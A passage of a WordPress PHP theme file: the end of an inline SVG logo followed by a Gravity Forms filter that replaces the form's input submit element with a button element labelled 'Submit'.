    <path d="M809.462 220.92C822.662 220.92 823.382 207.84 823.382 207.84H841.622C841.622 215.76 834.422 238.68 809.342 238.68C784.622 238.68 775.862 215.04 775.862 195.72C775.862 195.6 775.862 195.36 775.862 195.24C775.862 195 775.862 194.88 775.862 194.64C775.862 175.44 784.622 151.68 809.342 151.68C834.422 151.68 841.622 174.72 841.622 182.52H823.382C823.382 182.52 822.662 169.56 809.462 169.56C800.222 169.56 793.622 177.36 793.622 194.4C793.622 194.64 793.622 195 793.622 195.24C793.622 195.48 793.622 195.72 793.622 195.96C793.622 213.12 800.222 220.92 809.462 220.92ZM888.998 237L886.118 222.12H865.838L862.718 237H844.118L866.198 153.48H885.998L908.198 237H888.998ZM869.078 206.52H882.998L876.158 172.08L869.078 206.52ZM972.88 237H952.96L936.16 204H932.44V237H914.68V153.48L939.4 153.6C959.56 153.6 967.84 166.08 967.84 179.76C967.84 190.08 961.72 198.48 952.36 202.08L972.88 237ZM932.44 169.68V189.6H938.68C946.6 189.6 950.08 184.92 950.08 179.88C950.08 172.92 944.8 169.68 938.92 169.68H932.44ZM1015.71 193.08C1018.35 193.08 1032.39 197.52 1032.39 212.88C1032.39 228.6 1021.23 237 1005.75 237H980.07V153.48H1003.11C1016.55 153.48 1029.87 159.96 1029.87 175.44C1029.87 187.44 1020.27 193.08 1015.71 193.08ZM997.83 169.56V187.2H1001.55C1006.23 187.2 1011.99 186 1011.99 178.32C1011.99 170.52 1005.63 169.56 1001.67 169.56H997.83ZM1014.51 211.44C1014.51 203.64 1008.63 201.6 1002.75 201.6H997.83V220.92H1003.83C1009.95 220.92 1014.51 217.44 1014.51 211.44ZM1057.91 175.08C1057.91 184.56 1086.23 192.84 1086.23 214.68C1086.23 228.72 1076.15 238.68 1062.11 238.68C1042.67 238.68 1037.63 219 1037.63 219L1053.11 212.52C1053.11 212.52 1055.39 221.4 1062.11 221.4C1066.55 221.4 1068.35 217.32 1068.35 214.56C1068.35 201.84 1040.03 194.4 1040.03 173.76C1040.03 160.56 1050.47 151.68 1063.19 151.68C1076.99 151.68 1083.35 162.36 1086.59 169.32L1072.07 175.92C1071.35 174.48 1068.83 169.92 1063.91 169.92C1059.83 169.92 1057.91 172.2 1057.91 175.08Z" fill="#003B20"/>
    </svg>

    <?php
    return ob_get_clean();
});

add_filter( 'gform_submit_button_1', function($button, $form){
    $dom = new DOMDocument();
    $dom->loadHTML( '<?xml encoding="utf-8" ?>' . $button );
    $input = $dom->getElementsByTagName( 'input' )->item(0);
    $new_button = $dom->createElement( 'button' );
    $new_button->appendChild( $dom->createTextNode( 'Submit' ) );
    $input->removeAttribute( 'value' );
    foreach( $input->attributes as $attribute ) {
        $new_button->setAttribute( $attribute->name, $attribute->value );
    }
    $input->parentNode->replaceChild( $new_button, $input );
 
    return $dom->saveHtml( $new_button );
}, 10, 2 );